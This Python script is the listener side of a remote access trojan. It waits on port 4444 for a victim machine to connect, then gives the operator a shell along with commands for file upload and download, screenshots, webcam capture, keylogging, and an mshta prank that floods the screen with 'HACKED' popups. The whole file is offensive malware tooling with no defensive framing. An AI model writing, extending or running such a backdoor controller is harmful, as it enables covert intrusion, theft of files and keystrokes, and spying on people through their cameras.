import socket
import subprocess
import json
import os
import threading
import cv2
import numpy as np
from termcolor import colored


def data_recv(target, timeout=120):
    data = ''
    target.settimeout(timeout)
    while True:
        try:
            chunk = target.recv(4096).decode('latin-1')
            if not chunk:
                print("No data received")
                break
            data += chunk
            try:
                return json.loads(data)
            except ValueError:
                continue
        except socket.timeout:
            print("Timeout occurred")
            continue
    return data


def data_send(data, target):
    try:
        jsondata = json.dumps(data)
        target.sendall(jsondata.encode('latin-1'))
    except Exception as e:
        print(f"Error sending data: {e}")


def upload_file(file, target):
    try:
        with open(file, 'rb') as f:
            while True:
                chunk = f.read(4096)
                if not chunk:
                    break
                target.sendall(chunk)
        print(f"{file} uploaded")
    except Exception as e:
        print(e)


def download_file(file, target):
    print("Downloading file...")
    data = b''
    try:
        with open(file, 'wb') as f:
            target.settimeout(10)
            while True:
                chunk = target.recv(4096)
                if not chunk:
                    break
                data += chunk
                f.write(chunk)
            print(f"{file} downloaded")
    except socket.timeout as e:
        print(e)
    except Exception as e:
        print(e)
    finally:
        target.settimeout(None)


def keylogger_start(target):
    buffer = []

    def handle_keylogger():
        while True:
            data = data_recv(target)
            if isinstance(data, str):
                print(data)
                buffer.append(data)
                if len(buffer) >= 80:
                    data_send(''.join(buffer), target)
                    buffer.clear()

    listener_thread = threading.Thread(target=handle_keylogger, daemon=True)
    listener_thread.start()


def boom():
    commands = [
        'mshta "javascript:for (var i = 0; i < 10; i++) { alert(\'HACKED!!! HACKED!!! HACKED!!! HACKED!!!\'); } window.close();"',
        'mshta "javascript:for (var i = 0; i < 10; i++) { window.open(\'\',\'Window\' + i,\'width=1280,height=720\').document.write(\'<h1>HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHHA!</h1>\'); }"'
    ]

    for command in commands:
        try:
            subprocess.run(command, shell=True, check=True)
        except subprocess.CalledProcessError as e:
            print(f"Error: {e}")


def t_commun(target, ip):
    count = 0
    keylogger_thread = None
    while True:
        try:
            comm = input(colored('~(SHELL)# %s: ' % str(ip), 'green'))
            data_send(comm, target)
            if comm == 'exit':
                break
            elif comm == 'clear':
                os.system('clear')
            elif comm[:4] == 'boom':
                boom()
            elif comm[:3] == 'cd ':
                pass
            elif comm[:6] == 'upload':
                upload_file(comm[7:], target)
            elif comm[:8] == 'download':
                download_file(comm[9:], target)
            elif comm[:10] == 'screenshot':
                print("Capturing screenshot...")
                f = open(f'screenshot{count}.png', 'wb')
                target.settimeout(5)
                chunk = target.recv(4096)
                while chunk:
                    f.write(chunk)
                    try:
                        chunk = target.recv(4096)
                    except socket.timeout as e:
                        print(f'Error {e}')
                        break
                target.settimeout(None)
                print("Screenshot captured!")
                f.close()
                count += 1

            elif comm[:6] == 'webcam':
                print("Receiving webcam...")
                target.settimeout(5)
                while True:
                    try:
                        data = b''
                        while len(data) < 4:
                            data += target.recv(4 - len(data))
                        frame_size = int.from_bytes(data, 'big')

                        data = b''
                        while len(data) < frame_size:
                            data += target.recv(frame_size - len(data))
                        frame_data = data

                        np_arr = np.frombuffer(frame_data, np.uint8)
                        frame = cv2.imdecode(np_arr, cv2.IMREAD_COLOR)

                        if frame is not None:
                            cv2.imwrite(f'webcam_frame_{count}.jpg', frame)
                            count += 1
                        else:
                            print("Frame decode failed")
                    except Exception as e:
                        print(e)
                        break
                cv2.destroyAllWindows()
            elif comm[:10] == 'keylogger':
                keylogger_thread = threading.Thread(
                    target=keylogger_start, args=(target,), daemon=True)
                keylogger_thread.start()
                print("Keylogger started!")
            elif comm == 'help':
                print(colored('''\n
                exit: Close the session on the target machine
                clear: Clean terminal
                cd + "DirectoryName": Change directory (target machine)
                upload + "FileName": Send a file to target machine
                download + "FileName": Download a file from target machine
                screenshot: Takes a screenshot (target machine)
                webcam: Capture webcam image (target machine)
                keylogger: Start keylogger (target machine)
                help: Help the user to use the commands
\n '''), 'blue')
            else:
                answer = data_recv(target)
                print(answer)
        except Exception as e:
            print(f"Error: {e}")


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('0.0.0.0', 4444))
print(colored('[...] Waiting for connections', 'green'))
sock.listen(3)

target, ip = sock.accept()
print(colored('[!] Connected to:' + str(ip), 'red'))
t_commun(target, ip)
